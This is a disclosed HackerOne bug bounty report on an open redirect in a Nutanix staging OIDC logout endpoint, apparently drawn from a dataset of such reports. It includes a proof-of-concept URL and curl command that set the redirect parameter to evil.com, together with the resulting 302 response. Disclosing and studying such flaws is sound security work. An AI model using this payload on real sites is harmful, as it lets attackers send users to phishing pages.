---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1369806'
original_report_id: '1369806'
title: OPEN REDIRECT
weakness: Open Redirect
team_handle: nutanix
created_at: '2021-10-13T20:56:40.599Z'
disclosed_at: '2022-01-04T16:14:08.107Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 8
asset_identifier: '*.nutanix.com'
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
- open-redirect
---

# OPEN REDIRECT

## Metadata

- HackerOne Report ID: 1369806
- Weakness: Open Redirect
- Program: nutanix
- Disclosed At: 2022-01-04T16:14:08.107Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Open Redirect Vulnerability
Hello , found open redirect in https://stage.test.dev-iam.xi.nutanix.com/api/iam/authn/v1/oidc/logout?post_logout_redirect_uri=.

Go to

https://stage.test.dev-iam.xi.nutanix.com/api/iam/authn/v1/oidc/logout?post_logout_redirect_uri=http://evil.com&id_token_hint=test

curl -I "https://stage.test.dev-iam.xi.nutanix.com/api/iam/authn/v1/oidc/logout?post_logout_redirect_uri=http://evil.com&id_token_hint=test"

HTTP/2 302 
content-type: text/html; charset=utf-8
location: http://evil.com
date: Wed, 13 Oct 2021 20:55:57 GMT
x-envoy-upstream-service-time: 2
server: envoy


##Reference

https://hackerone.com/reports/504751
https://portswigger.net/kb/issues/00500100_open-redirection-reflected

## Impact

An attacker can use this vulnerability to redirect users to other malicious websites, which can be used for phishing and similar attacks

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
